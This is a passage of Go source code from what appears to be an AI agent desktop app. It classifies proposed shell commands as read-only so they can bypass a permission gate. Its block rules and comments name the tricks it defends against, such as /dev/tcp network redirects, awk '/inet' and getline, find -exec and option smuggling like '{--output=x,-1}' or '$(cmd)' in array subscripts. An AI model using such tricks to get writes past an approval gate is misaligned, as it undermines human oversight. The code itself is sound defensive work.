package main

import (
	"os"
	"path"
	"regexp"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"

	"github.com/katachinosekai/quill/internal/protocol"
)

var readOnlyTools = map[string]bool{"Read": true, "Grep": true, "Glob": true, "LS": true, "ToolSearch": true, "ListAgents": true, "NotebookRead": true}

var readOnlyCommands = map[string]bool{
	"ls": true, "cat": true, "head": true, "tail": true, "grep": true, "rg": true, "wc": true, "file": true, "stat": true,
	"sort": true, "uniq": true, "cut": true, "tr": true, "diff": true, "cmp": true, "sha256sum": true, "md5sum": true,
	"du": true, "df": true, "pwd": true, "which": true, "date": true, "echo": true, "printf": true, "true": true,
	"pgrep": true, "ps": true, "uptime": true, "free": true, "id": true, "whoami": true, "basename": true, "dirname": true,
	"realpath": true, "readlink": true, "tree": true, "jq": true, "column": true, "nl": true, "strings": true,
	"cd": true, "test": true, "[": true, "tac": true, "rev": true, "od": true, "hexdump": true, "sha1sum": true,
	"sha512sum": true, "uname": true, "nproc": true, "lscpu": true, "lsblk": true, "printenv": true, "seq": true,
	"type": true, "findmnt": true, "pdfinfo": true, "read": true,
}

var argChecked = map[string]bool{
	"kmem": true, "sed": true, "find": true, "git": true, "sort": true, "tree": true, "rg": true, "file": true, "uniq": true,
	"awk": true, "journalctl": true, "date": true, "systemctl": true, "command": true, "pdftotext": true, "gh": true,
}

// ghReads: gh subcommands that only show things (without --web).
var ghReads = map[string]map[string]bool{
	"pr":      {"view": true, "list": true, "diff": true, "checks": true, "status": true},
	"issue":   {"view": true, "list": true, "status": true},
	"release": {"view": true, "list": true},
	"repo":    {"view": true},
	"run":     {"view": true, "list": true},
}

var (
	pdftotextFlags     = map[string]bool{"-layout": true, "-raw": true, "-nopgbrk": true, "-nodiag": true, "-htmlmeta": true, "-bbox": true, "-bbox-layout": true, "-tsv": true, "-cropbox": true, "-q": true, "-simple": true, "-simple2": true}
	pdftotextValueOpts = map[string]bool{"-f": true, "-l": true, "-r": true, "-x": true, "-y": true, "-W": true, "-H": true, "-fixed": true, "-enc": true, "-eol": true, "-opw": true, "-upw": true, "-colspacing": true}
)

var readOnlyGit = map[string]bool{"status": true, "log": true, "diff": true, "show": true, "branch": true, "remote": true, "rev-parse": true, "ls-files": true, "blame": true, "describe": true}

var journalWrites = []string{"--vacuum", "--rotate", "--flush", "--sync", "--relinquish", "--smart-relinquish", "--setup-keys", "--update-catalog", "--cursor-file"}

var (
	shName         = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*`)
	assignName     = regexp.MustCompile(`^([A-Za-z_][A-Za-z0-9_]*)=`)
	sedPrintRange  = regexp.MustCompile(`^(\d+|\$)?(,(\d+|\$))?p$`)
	readOnlyBinDir = []string{"/usr/bin/", "/bin/", "/usr/local/bin/", "/usr/sbin/", "~/.local/bin/"}
	braceParam     = regexp.MustCompile(`^(#?[A-Za-z_][A-Za-z0-9_]*|[A-Za-z_][A-Za-z0-9_]*(:?[-+?]|##?|%%?|//?|\^\^?|,,?)[A-Za-z0-9_./,%#+*?^~: -]*)$`)
	fdNumber       = regexp.MustCompile(`^([0-9]+|-)$`)
)

// redirEnd: a redirect target ends at n (a blank, a separator or another
// redirect), so nothing glued on (`>&1"/../x"`, `>/dev/null"x"`) changes it.
func redirEnd(cmd string, n int) bool {
	return n >= len(cmd) || strings.IndexByte(" \t\n;&|<>", cmd[n]) >= 0
}

// outTarget: the only files `>`, `>>`, `>|` and `&>` may write.
func outTarget(t string) bool {
	return t == "/dev/null" || t == "/dev/stdout" || t == "/dev/stderr"
}

// inTarget: a file `<` may read: no bash network pseudo-files
// (/dev/tcp/HOST/PORT, /dev/udp/…), no other device or /proc file, no glob.
func inTarget(t string) bool {
	if t == "" || strings.ContainsAny(t, "*?[$") {
		return false
	}
	c := path.Clean(t)
	if c == "/dev/null" || c == "/dev/stdin" {
		return true
	}
	return !strings.HasPrefix(c, "/dev/") && c != "/dev" && c != "/proc" && !strings.HasPrefix(c, "/proc/")
}

// shWord: one word of a parsed shell command. alts lists every value a word
// can take when it uses a for-loop variable (`for p in a b; do x $p; done`);
// text is then alts[0] and readOnlySegment checks each value.
type shWord struct {
	text    string
	unknown bool
	plain   bool // only unquoted literal characters, so it can be a shell keyword
	alts    []string
}

func (w shWord) values() []string {
	if len(w.alts) > 0 {
		return w.alts
	}
	return []string{w.text}
}

// maxAlts caps the values one word (or one variable) can take; more counts
// as unknown.
const maxAlts = 64

// shKeywords open or close if/while/until/for bodies; shSegments drops them
// and keeps the commands they lead into (`do sed -n 1p f` → `sed -n 1p f`).
var shKeywords = map[string]bool{"if": true, "then": true, "elif": true, "else": true, "fi": true, "while": true, "until": true, "do": true, "done": true, "!": true}

// braceExpansion: an unquoted {a,b} or {1..3} that bash turns into several
// words (`git log {--output=x,-1}`), so the word counts as unknown.
var braceExpansion = regexp.MustCompile(`\{[^{}]*(,|\.\.)[^{}]*\}`)

// shLoop: an open while/until/for body. used: variables read inside it; a
// variable used there can't be set again inside it, or the next round would
// see a value the parser never checked (`for i in 1 2; do sed -n $X f; X=w; done`).
type shLoop struct {
	used      map[string]bool
	forVar    string
	before    shWord
	hadBefore bool
	cond      bool
}

// unionWord: a variable that holds either a or b (a set only conditionally).
func unionWord(a shWord, hadA bool, b shWord) shWord {
	if !hadA || a.unknown || b.unknown {
		return shWord{text: b.text, unknown: true}
	}
	var vals []string
	seen := map[string]bool{}
	for _, v := range append(append([]string{}, a.values()...), b.values()...) {
		if !seen[v] {
			seen[v] = true
			vals = append(vals, v)
		}
	}
	if len(vals) > maxAlts {
		return shWord{text: b.text, unknown: true}
	}
	if len(vals) == 1 {
		return shWord{text: vals[0]}
	}
	return shWord{text: vals[0], alts: vals}
}

func shTarget(cmd string, j int) (string, int) {
	for j < len(cmd) && (cmd[j] == ' ' || cmd[j] == '\t') {
		j++
	}
	k := j
	for k < len(cmd) && !strings.ContainsRune(" \t\n;&|<>()'\"`$\\", rune(cmd[k])) {
		k++
	}
	return cmd[j:k], k
}

// shSegments splits a shell command into simple commands, expanding the
// variables it set itself. It fails (false) on anything it can't follow:
// command substitution, subshells, here-docs, redirects to files.
func shSegments(cmd string) ([][]shWord, bool) {
	vars := map[string]shWord{}
	if home, err := os.UserHomeDir(); err == nil {
		vars["HOME"] = shWord{text: home}
	}
	var segs [][]shWord
	var seg []shWord
	cur := []string{""} // every value of the word being read
	var raw strings.Builder
	in, unknown, plain := false, false, true
	var loops []*shLoop
	compound, ifs := 0, 0
	prevSep := ";"
	add := func(s string) {
		for i := range cur {
			cur[i] += s
		}
	}
	bad := false
	var closed []*shLoop // loops whose `done` this segment read
	// keyword opens or closes if/while/until bodies as soon as it is read, so
	// a while/until loop is open before its condition: a variable the
	// condition uses can't be set later in the body
	// (`X=-1; while git log $X; do X=--output=f; done`).
	keyword := func(k string) {
		switch k {
		case "if":
			compound++
			ifs++
		case "fi":
			if ifs == 0 {
				bad = true
				return
			}
			ifs--
			compound--
		case "while", "until":
			loops = append(loops, &shLoop{used: map[string]bool{}})
			compound++
		case "done":
			if len(loops) == 0 {
				bad = true
				return
			}
			closed = append(closed, loops[len(loops)-1])
			loops = loops[:len(loops)-1]
			compound--
		}
	}
	word := func() {
		if in {
			if braceExpansion.MatchString(raw.String()) {
				unknown = true
			}
			w := shWord{text: cur[0], unknown: unknown, plain: plain}
			if len(cur) > 1 {
				w.alts = cur
			}
			if len(seg) == 0 && w.plain && !w.unknown && shKeywords[w.text] {
				keyword(w.text)
			} else {
				seg = append(seg, w)
			}
		}
		cur = []string{""}
		raw.Reset()
		in, unknown, plain = false, false, true
	}
	fd := func() {
		if in && strings.HasSuffix(raw.String(), "}") {
			bad = true // {NAME}>f stores a descriptor number in NAME
		}
		if in && len(cur) == 1 && plain && strings.Trim(cur[0], "0123456789") == "" {
			cur = []string{""}
			raw.Reset()
			in, unknown, plain = false, false, true
		}
		word()
	}
	bind := func(name string, v shWord, cond bool) bool {
		for _, l := range loops {
			if l.used[name] {
				return false
			}
		}
		if old, ok := vars[name]; cond {
			vars[name] = unionWord(old, ok, v)
		} else {
			vars[name] = v
		}
		return true
	}
	end := func(sep string) bool {
		word()
		if bad {
			return false
		}
		for _, l := range closed {
			if l.forVar != "" && (l.cond || sep == "|" || sep == "&") {
				v := vars[l.forVar]
				vars[l.forVar] = unionWord(l.before, l.hadBefore, v)
			}
		}
		closed = nil
		cond := compound > 0 || prevSep == "&&" || prevSep == "||" || prevSep == "|" || sep == "|" || sep == "&"
		prevSep = sep
		if len(seg) == 0 {
			return true
		}
		if seg[0].plain && seg[0].text == "for" {
			// for NAME in WORDS: the body sees exactly these words.
			if len(seg) < 4 || !seg[1].plain || shName.FindString(seg[1].text) != seg[1].text || !seg[2].plain || seg[2].text != "in" {
				return false
			}
			name := seg[1].text
			if !userVar(name) {
				return false // for PATH in …, for IFS in …
			}
			v := shWord{}
			var vals []string
			for _, w := range seg[3:] {
				if w.unknown {
					v.unknown = true
				}
				for _, x := range w.values() {
					if strings.ContainsAny(x, "*?[") {
						v.unknown = true
					}
					vals = append(vals, x)
				}
			}
			v.text = vals[0]
			if len(vals) > maxAlts {
				v.unknown = true
			} else if len(vals) > 1 {
				v.alts = vals
			}
			if v.unknown {
				v.alts = nil
			}
			l := &shLoop{used: map[string]bool{}, forVar: name, cond: cond}
			l.before, l.hadBefore = vars[name]
			if !bind(name, v, false) {
				return false
			}
			loops = append(loops, l)
			compound++
			segs = append(segs, seg)
			seg = nil
			return true
		}
		ci := 0
		for ci < len(seg) && assignName.MatchString(seg[ci].text) {
			ci++
		}
		switch {
		case ci == len(seg):
			for _, w := range seg {
				n := assignName.FindStringSubmatch(w.text)[1]
				v := shWord{text: w.text[len(n)+1:], unknown: w.unknown}
				if len(w.alts) > 1 {
					for _, a := range w.alts {
						v.alts = append(v.alts, a[len(n)+1:])
					}
				}
				if !bind(n, v, cond) {
					return false
				}
			}
		case seg[ci].text == "read":
			// read sets the variables it names (and REPLY) from its input.
			args := make([]string, 0, len(seg)-ci-1)
			for _, w := range seg[ci+1:] {
				if w.unknown || len(w.alts) > 1 {
					return false
				}
				args = append(args, w.text)
			}
			names, ok := readNames(args)
			if !ok {
				return false
			}
			for _, a := range append(names, "REPLY") {
				if !bind(a, shWord{text: a, unknown: true}, cond) {
					return false
				}
			}
		case seg[ci].text == "cd":
			for _, n := range []string{"PWD", "OLDPWD"} {
				if !bind(n, shWord{text: n, unknown: true}, cond) {
					return false
				}
			}
		}
		segs = append(segs, seg)
		seg = nil
		return true
	}
	dollar := func(i int, quoted bool) (int, bool) {
		in = true
		plain = false
		raw.WriteByte(0)
		rest := cmd[i+1:]
		var name string
		next := i
		switch {
		case strings.HasPrefix(rest, "("), strings.HasPrefix(rest, "["):
			return i, false // $(cmd), $((expr)), $[expr]
		case !quoted && rest != "" && (rest[0] == '\'' || rest[0] == '"'):
			return i, false // $'\x2d…' and $"…" quote words the parser would read literally
		case strings.HasPrefix(rest, "{"):
			j := strings.IndexByte(rest, '}')
			if j < 0 {
				return i, false
			}
			name, next = rest[1:j], i+1+j
			// Only ${X}, ${#X} and ${X<op>literal}: no nested $ / ` / { / quotes
			// (`${X:-$(cmd)}`), no ${X:=v} (sets X), no arithmetic
			// (${X:n}, ${a[n]}) and no ${X@P} or ${!X}.
			if !braceParam.MatchString(name) {
				return i, false
			}
			base := shName.FindString(strings.TrimPrefix(name, "#"))
			for _, l := range loops {
				l.used[base] = true
			}
		case shName.MatchString(rest):
			name = shName.FindString(rest)
			next = i + len(name)
		case rest != "" && strings.IndexByte("$?#@*!-0123456789", rest[0]) >= 0:
			add(cmd[i : i+2])
			unknown = true
			return i + 1, true
		default:
			add("$")
			return i, true
		}
		for _, l := range loops {
			l.used[name] = true
		}
		v, ok := vars[name]
		if !ok || shName.FindString(name) != name {
			add(cmd[i : next+1])
			unknown = true
			return next, true
		}
		if v.unknown {
			unknown = true
		}
		vals := v.values()
		for _, x := range vals {
			if !quoted && strings.ContainsAny(x, " \t\n*?[") {
				unknown = true
			}
		}
		if len(vals) == 1 {
			add(vals[0])
			return next, true
		}
		var n []string
		for _, c := range cur {
			for _, x := range vals {
				n = append(n, c+x)
			}
		}
		if len(n) > maxAlts {
			unknown = true
			n = n[:1]
		}
		cur = n
		return next, true
	}
	for i := 0; i < len(cmd); i++ {
		ch := cmd[i]
		var ok bool
		switch ch {
		case '\'':
			j := strings.IndexByte(cmd[i+1:], '\'')
			if j < 0 {
				return nil, false
			}
			add(cmd[i+1 : i+1+j])
			raw.WriteByte(0)
			in, plain = true, false
			i += j + 1
		case '"':
			in, plain = true, false
			raw.WriteByte(0)
			for i++; i < len(cmd) && cmd[i] != '"'; i++ {
				c := cmd[i]
				switch {
				case c == '`':
					return nil, false
				case c == '$':
					if i, ok = dollar(i, true); !ok {
						return nil, false
					}
				case c == '\\' && i+1 < len(cmd) && strings.IndexByte("$`\"\\\n", cmd[i+1]) >= 0:
					i++
					add(string(cmd[i]))
				default:
					add(string(c))
				}
			}
			if i >= len(cmd) {
				return nil, false
			}
		case '\\':
			if i+1 >= len(cmd) {
				return nil, false
			}
			i++
			if cmd[i] != '\n' {
				add(string(cmd[i]))
				raw.WriteByte(0)
				in, plain = true, false
			}
		case '$':
			if i, ok = dollar(i, false); !ok {
				return nil, false
			}
		case '`', '(', ')':
			return nil, false
		case ' ', '\t':
			word()
		case ';', '\n':
			if !end(";") {
				return nil, false
			}
		case '#':
			if in {
				add("#")
				raw.WriteByte(ch)
				continue
			}
			for i < len(cmd) && cmd[i] != '\n' {
				i++
			}
			if !end(";") {
				return nil, false
			}
		case '|':
			sep := "|"
			if strings.HasPrefix(cmd[i+1:], "|") {
				sep = "||"
				i++
			} else if strings.HasPrefix(cmd[i+1:], "&") {
				i++
			}
			if !end(sep) {
				return nil, false
			}
		case '&':
			switch {
			case strings.HasPrefix(cmd[i+1:], ">"):
				word()
				i++
				if strings.HasPrefix(cmd[i+1:], ">") {
					i++
				}
				t, n := shTarget(cmd, i+1)
				if !outTarget(t) || !redirEnd(cmd, n) {
					return nil, false
				}
				i = n - 1
			case strings.HasPrefix(cmd[i+1:], "&"):
				i++
				if !end("&&") {
					return nil, false
				}
			default:
				if !end("&") {
					return nil, false
				}
			}
		case '>':
			fd()
			rest := cmd[i+1:]
			switch {
			case strings.HasPrefix(rest, "&"):
				// >&N duplicates a descriptor; >&WORD writes the file WORD.
				t, n := shTarget(cmd, i+2)
				if !fdNumber.MatchString(t) || !redirEnd(cmd, n) {
					return nil, false
				}
				i = n - 1
			case strings.HasPrefix(rest, "("):
				return nil, false
			default:
				j := i + 1
				if strings.HasPrefix(rest, ">") || strings.HasPrefix(rest, "|") {
					j++
				}
				t, n := shTarget(cmd, j)
				if !outTarget(t) || !redirEnd(cmd, n) {
					return nil, false
				}
				i = n - 1
			}
		case '<':
			fd()
			if rest := cmd[i+1:]; rest != "" && strings.IndexByte("<(&>", rest[0]) >= 0 {
				return nil, false
			}
			t, n := shTarget(cmd, i+1)
			if !inTarget(t) || !redirEnd(cmd, n) {
				return nil, false
			}
			i = n - 1
		default:
			add(string(ch))
			raw.WriteByte(ch)
			in = true
		}
	}
	if !end(";") || len(loops) > 0 || ifs > 0 {
		return nil, false
	}
	return segs, true
}

// readNames: the variables `read [options] NAME…` sets. Not ok for an
// option it doesn't know, a non-numeric count or timeout, or a name that is
// not a userVar: `read 'a[$(cmd)]'` runs cmd (array subscripts are
// arithmetic), `read PATH` changes what the next command runs.
func readNames(args []string) ([]string, bool) {
	var names []string
	i := 0
	for ; i < len(args) && len(args[i]) > 1 && args[i][0] == '-'; i++ {
		a := args[i]
		if a == "--" {
			i++
			break
		}
		for j := 1; j < len(a); j++ {
			c := a[j]
			switch {
			case strings.IndexByte("rse", c) >= 0:
				continue
			case strings.IndexByte("adinNptu", c) < 0:
				return nil, false
			}
			v := a[j+1:]
			if v == "" {
				if i+1 >= len(args) {
					return nil, false
				}
				i++
				v = args[i]
			}
			switch {
			case c == 'a':
				names = append(names, v)
			case strings.IndexByte("nNu", c) >= 0 && (v == "" || strings.Trim(v, "0123456789") != ""):
				return nil, false
			case c == 't' && (v == "" || strings.Trim(v, "0123456789.") != ""):
				return nil, false
			}
			break
		}
	}
	names = append(names, args[i:]...)
	for _, n := range names {
		if !userVar(n) {
			return nil, false
		}
	}
	return names, true
}

// testUnary / testBinary: test operators whose operands are only compared or
// looked up as files. -v and -R are left out: they evaluate an array
// subscript (`test -v 'a[$(cmd)]'` runs cmd).
var (
	testUnary  = map[string]bool{"-a": true, "-b": true, "-c": true, "-d": true, "-e": true, "-f": true, "-g": true, "-h": true, "-k": true, "-L": true, "-n": true, "-N": true, "-O": true, "-G": true, "-p": true, "-r": true, "-s": true, "-S": true, "-t": true, "-u": true, "-w": true, "-x": true, "-z": true}
	testBinary = map[string]bool{"=": true, "==": true, "!=": true, "<": true, ">": true, "-eq": true, "-ne": true, "-lt": true, "-le": true, "-gt": true, "-ge": true, "-nt": true, "-ot": true, "-ef": true}
)

// readOnlyTest: test / [ with no -v, -R or subscript, and every word whose
// value the parser doesn't know standing where it can only be an operand
// (after a unary operator, beside a binary one, or alone).
func readOnlyTest(args []shWord) bool {
	if len(args) > 0 && args[len(args)-1].text == "]" && !args[len(args)-1].unknown {
		args = args[:len(args)-1]
	}
	for i, w := range args {
		if w.text == "-v" || w.text == "-R" || strings.Contains(w.text, "[") {
			return false
		}
		if !w.unknown || len(args) == 1 {
			continue
		}
		after := i > 0 && !args[i-1].unknown && (testUnary[args[i-1].text] || testBinary[args[i-1].text])
		before := i+1 < len(args) && !args[i+1].unknown && testBinary[args[i+1].text]
		if !after && !before {
			return false
		}
	}
	return true
}

func binName(w string) string {
	if !strings.Contains(w, "/") {
		return w
	}
	dir, base := path.Split(w)
	for _, d := range readOnlyBinDir {
		if dir == d {
			return base
		}
	}
	if home, err := os.UserHomeDir(); err == nil && dir == home+"/.local/bin/" {
		return base
	}
	return ""
}

var (
	lowerVar = regexp.MustCompile(`^[a-z_][a-z0-9_]*$`)
	upperVar = regexp.MustCompile(`^[A-Z][0-9]*$`)
	// userUpperVars: upper-case names no program or shell reads.
	userUpperVars = map[string]bool{
		"REPLY": true, "DIR": true, "FILE": true, "FILES": true, "OUT": true, "NAME": true, "REPO": true, "BRANCH": true,
		"TOPIC": true, "ID": true, "COUNT": true, "LINE": true, "MSG": true, "SRC": true, "DST": true, "KEY": true,
		"VAL": true, "PATTERN": true, "PAT": true, "REV": true, "COMMIT": true, "SHA": true,
	}
	localeValue = regexp.MustCompile(`^(C|POSIX|[A-Za-z]{2,3}(_[A-Z]{2})?)(\.[A-Za-z0-9-]+)?$`)
	tzValue     = regexp.MustCompile(`^:?[A-Za-z][A-Za-z0-9_+-]*(/[A-Za-z][A-Za-z0-9_+-]*)*$`)
)

// userVar: a variable name that only the command itself reads, so setting
// it (NAME=v, for NAME in, read NAME) can't change what another program
// does: lower-case names (not *proxy*), one capital letter (X, S2) and
// userUpperVars. PATH, HOME, IFS, LD_*, GIT_*, XDG_*, GH_*, PAGER,
// RIPGREP_CONFIG_PATH, GCONV_PATH, … are all refused (allow list, not a
// deny list: adversarial review 2026-11-23).
func userVar(name string) bool {
	if lowerVar.MatchString(name) {
		return !strings.Contains(name, "proxy")
	}
	return upperVar.MatchString(name) || userUpperVars[name]
}

// safeAssign: NAME=value in front of or before a command. Besides userVar
// names, a few common environment settings with a harmless value.
func safeAssign(name, value string, known bool) bool {
	if userVar(name) {
		return true
	}
	if !known {
		return false
	}
	switch {
	case name == "LC_ALL" || name == "LANG" || name == "LANGUAGE" || strings.HasPrefix(name, "LC_") && shName.MatchString(name):
		return localeValue.MatchString(value)
	case name == "TZ":
		return tzValue.MatchString(value)
	case name == "PAGER" || name == "GIT_PAGER" || name == "GH_PAGER" || name == "SYSTEMD_PAGER":
		return value == "" || value == "cat"
	case name == "NO_COLOR" || name == "COLUMNS":
		return strings.Trim(value, "0123456789") == ""
	}
	return false
}

func readOnlySed(args []string) bool {
	quiet := false
	script := 0
	for _, a := range args {
		switch {
		case a == "-n" || a == "--quiet" || a == "--silent":
			quiet = true
		case strings.HasPrefix(a, "-"):
			return false
		case script == 0:
			script++
			if !sedPrintRange.MatchString(a) {
				return false
			}
		}
	}
	return quiet && script == 1
}

// longOpt: a matches one of the long options opts, also as the abbreviation
// GNU getopt_long and git accept (`sort --out=f`, `journalctl --rot`), or as
// a longer option starting with one (`--output-indicator-new`).
func longOpt(a string, opts ...string) bool {
	if !strings.HasPrefix(a, "--") {
		return false
	}
	name, _, _ := strings.Cut(a, "=")
	if len(name) < 3 {
		return false
	}
	for _, o := range opts {
		if strings.HasPrefix(o, name) || strings.HasPrefix(name, o) {
			return true
		}
	}
	return false
}

// shortFlag: a is a short-option word (-x, or combined -bCm) holding one of
// letters.
func shortFlag(a, letters string) bool {
	return len(a) > 1 && a[0] == '-' && a[1] != '-' && strings.ContainsAny(a[1:], letters)
}

// readOnlyAwk: an awk program (or file operand / assignment) that can't
// write, run or connect anywhere. Checked on the raw text, string literals
// included, so a quote or brace inside a string can't hide anything
// (`print "}" > "f"`): no pipes, no getline, no system(), no @ (indirect
// calls, @load), no /inet and no ARGV/ARGC (gawk opens `ARGV[1]="/in" "et/…"`
// as a network connection), and no `>` at all in a program that prints.
func readOnlyAwk(a string) bool {
	if strings.ContainsAny(a, "|@`") {
		return false
	}
	for _, w := range []string{"system", "getline", "/inet", "inplace", "ARGV", "ARGC"} {
		if strings.Contains(a, w) {
			return false
		}
	}
	return !(strings.Contains(a, ">") && strings.Contains(a, "print"))
}

func readOnlyGitArgs(sub string, args []string) bool {
	for _, a := range args {
		if longOpt(a, "--output", "--ext-diff") {
			return false
		}
	}
	switch sub {
	case "branch":
		for _, a := range args {
			switch a {
			case "-a", "-r", "-v", "-vv", "--list", "--show-current", "--all", "--remotes":
			default:
				return false
			}
		}
	case "remote":
		// "git remote get-url [--push] [--all] NAME" only prints a URL.
		if len(args) > 0 && args[0] == "get-url" {
			names := 0
			for _, a := range args[1:] {
				switch {
				case a == "--push" || a == "--all":
				case strings.HasPrefix(a, "-"):
					return false
				default:
					names++
				}
			}
			return names == 1
		}
		for _, a := range args {
			if a != "-v" && a != "--verbose" {
				return false
			}
		}
	}
	return true
}

func readOnlyRequest(r *protocol.ControlRequest, extra [][]string) bool {
	return requestClass(r, extra) == classRead
}

func readOnlyCommand(cmd string, extra [][]string) bool {
	return commandClass(cmd, extra) == classRead
}

func hasWordPrefix(f, prefix []string) bool {
	if len(prefix) == 0 || len(prefix) > len(f) {
		return false
	}
	for i, w := range prefix {
		if f[i] != w {
			return false
		}
	}
	return true
}

// readOnlySegment: one simple command from shSegments only reads.
func readOnlySegment(seg []shWord, extra [][]string) bool {
	return segmentClass(seg, extra) == classRead
}

// segmentClass: the class of one simple command from shSegments. A word
// holding a for-loop variable is checked with each of its values; the
// strictest wins.
func segmentClass(seg []shWord, extra [][]string) gateClass {
	if len(seg) > 0 && seg[0].plain && seg[0].text == "for" {
		return classRead // a loop header shSegments checked: sets the loop variable only
	}
	n := 1
	for _, w := range seg {
		if len(w.alts) > 1 {
			if n *= len(w.alts); n > 256 {
				return classGated
			}
		}
	}
	if n == 1 {
		return wordsClass(seg, extra)
	}
	c := classRead
	for k := 0; k < n; k++ {
		one := make([]shWord, len(seg))
		r := k
		for i, w := range seg {
			one[i] = w
			if len(w.alts) > 1 {
				one[i].text, one[i].alts = w.alts[r%len(w.alts)], nil
				r /= len(w.alts)
			}
		}
		if c = max(c, wordsClass(one, extra)); c == classGated {
			return c
		}
	}
	return c
}

func readOnlyWords(seg []shWord, extra [][]string) bool {
	o := gateOptsOf(extra)
	isRead, isKmem := false, false
	for _, w := range seg {
		if !assignName.MatchString(w.text) {
			isRead = w.text == "read"
			isKmem = binName(w.text) == "kmem"
			break
		}
	}
	for len(seg) > 0 {
		m := assignName.FindStringSubmatch(seg[0].text)
		if m == nil {
			break
		}
		v := seg[0].text[len(m[0]):]
		// `IFS= read -r line` only changes how read splits its input;
		// KMEM_SESSION=<own name> kmem … is `kmem --as <own name>` (gatesplit.go).
		ownKmem := isKmem && m[1] == "KMEM_SESSION" && o.own != "" && !seg[0].unknown && v == o.own
		if !safeAssign(m[1], v, !seg[0].unknown) && !(isRead && m[1] == "IFS") && !ownKmem {
			return false
		}
		seg = seg[1:]
	}
	if len(seg) == 0 {
		return true
	}
	name := binName(seg[0].text)
	if seg[0].unknown || name == "" {
		return false
	}
	f := []string{name}
	for _, w := range seg[1:] {
		f = append(f, w.text)
	}
	// Root never counts as read-only, whatever the user's list says
	// (ta43580; gatebatch.go).
	if privilegedWords(append([]string{seg[0].text}, f[1:]...)) {
		return false
	}
	unknownArg := false
	for _, w := range seg[1:] {
		unknownArg = unknownArg || w.unknown
	}
	if name == "kmem" {
		// kmem takes its options anywhere (`kmem rules --as x`), so word
		// prefixes don't fit it: kmemAllowed matches extra lines itself.
		return kmemAllowed(f[1:], unknownArg, extra, o.split)
	}
	for _, e := range extra {
		if hasWordPrefix(f, e) {
			return true
		}
	}
	if argChecked[name] && unknownArg {
		return false
	}
	args := f[1:]
	if o.split {
		switch name {
		case "timeout":
			return timeoutRead(seg, extra)
		case "pzlock":
			return !unknownArg && readOnlyPzlock(args)
		}
	}
	switch name {
	case "sed":
		return readOnlySed(args)
	case "find":
		for _, a := range args {
			if a == "-delete" || strings.HasPrefix(a, "-exec") || strings.HasPrefix(a, "-ok") || strings.HasPrefix(a, "-fprint") || a == "-fls" {
				return false
			}
		}
	case "git":
		for len(args) > 0 && strings.HasPrefix(args[0], "-") {
			switch {
			case args[0] == "-C" && len(args) > 1:
				args = args[2:]
			case args[0] == "--no-pager" || args[0] == "-P":
				args = args[1:]
			default:
				return false
			}
		}
		if len(args) > 0 && readOnlyGit[args[0]] && readOnlyGitArgs(args[0], args[1:]) {
			return true
		}
		return o.split && len(args) > 0 && readOnlyGitMore(args[0], args[1:])
	case "sort":
		for _, a := range args {
			if longOpt(a, "--output", "--compress-program") || shortFlag(a, "o") {
				return false
			}
		}
	case "tree":
		// -o FILE writes FILE; -R with -H writes 00Tree.html in every directory.
		for _, a := range args {
			if longOpt(a, "--output") || shortFlag(a, "oRH") {
				return false
			}
		}
	case "rg":
		// --pre and --hostname-bin run a program; -z runs decompressors.
		for _, a := range args {
			if longOpt(a, "--pre", "--pre-glob", "--search-zip", "--hostname-bin") || shortFlag(a, "z") {
				return false
			}
		}
	case "file":
		for _, a := range args {
			if longOpt(a, "--compile") || shortFlag(a, "C") {
				return false
			}
		}
	case "uniq":
		files := 0
		for _, a := range args {
			if a == "-" || !strings.HasPrefix(a, "-") {
				files++
			}
		}
		return files <= 1
	case "awk":
		for i := 0; i < len(args); i++ {
			a := args[i]
			switch {
			case a == "-F" || a == "-v":
				i++
			case strings.HasPrefix(a, "-F") || strings.HasPrefix(a, "-v"):
			case strings.HasPrefix(a, "-"):
				return false
			case !readOnlyAwk(a):
				return false
			}
		}
	case "journalctl":
		for _, a := range args {
			if longOpt(a, journalWrites...) {
				return false
			}
		}
	case "systemctl":
		// Status and listing verbs only (systemctlReads), user or system
		// units, on this machine (-H/--host runs it over ssh, -M in a
		// container); privilegedWords already refused every other system verb.
		for _, a := range args {
			if longOpt(a, "--host", "--machine") || shortFlag(a, "HM") {
				return false
			}
		}
		for _, a := range args {
			if !strings.HasPrefix(a, "-") {
				return systemctlReads[a]
			}
		}
		return false
	case "date":
		for _, a := range args {
			if longOpt(a, "--set") || shortFlag(a, "s") {
				return false
			}
		}
	case "read":
		_, ok := readNames(args)
		return ok && !unknownArg
	case "test", "[":
		return readOnlyTest(seg[1:])
	case "printf":
		// printf -v NAME sets a variable the parser would not follow.
		return len(seg) == 1 || !seg[1].unknown && !strings.HasPrefix(args[0], "-v")
	case "command":
		return readOnlyCommandV(args)
	case "pdftotext":
		return readOnlyPdftotext(args)
	case "gh":
		return readOnlyGh(args)
	default:
		return readOnlyCommands[name]
	}
	return true
}

func parseReadOnlyExtra(text string) [][]string {
	var out [][]string
	for _, line := range strings.Split(text, "\n") {
		if strings.IndexByte(line, 0) >= 0 {
			continue // marker lines (gatesplit.go) are Quill's own
		}
		segs, ok := shSegments(strings.TrimSpace(line))
		if !ok || len(segs) != 1 {
			continue
		}
		f := []string{binName(segs[0][0].text)}
		if f[0] == "" {
			continue
		}
		for _, w := range segs[0][1:] {
			f = append(f, w.text)
		}
		out = append(out, f)
	}
	return out
}

const builtinReadOnly = "kmem brief\nkmem get\nkmem find\nkmem show\nkmem context\nkmem recall\nkmem rules\nkmem task list\nkmem task check\nkmem handoff get\nkmem handoff list\nkmem handoff policy"

// quillReadOnly: Quill Desktop's own read-only commands. `quill settings
// list/get` only read (settingsreg.go); `set` and `undo` change settings and
// stay plan-gated (docs/design/quill-operator.md §3.8).
const quillReadOnly = "quill settings list\nquill settings get"

func (d *desk) readOnlyExtra() [][]string {
	extra := append(parseReadOnlyExtra(builtinReadOnly+"\n"+quillReadOnly), userReadOnlyExtra(d.app.Preferences().String("extraReadOnly"))...)
	if d.gateSplitOn() {
		extra = append(extra, []string{markSplit})
	}
	return extra
}

// userReadOnlyExtra: the user's Read-only commands. A kmem line counts only
// when it names a kmem read (`kmem get`, `kmem --as x brief`): kmem is
// classified by its verb, so a bare `kmem` line or `kmem retire` can't let a
// kmem write through (guard audit §4).
func userReadOnlyExtra(text string) [][]string {
	var out [][]string
	for _, e := range parseReadOnlyExtra(text) {
		if e[0] == "kmem" {
			if _, words, ok := kmemSplit(e[1:]); !ok || len(words) == 0 || !readOnlyKmemWords(words, true) {
				continue
			}
		}
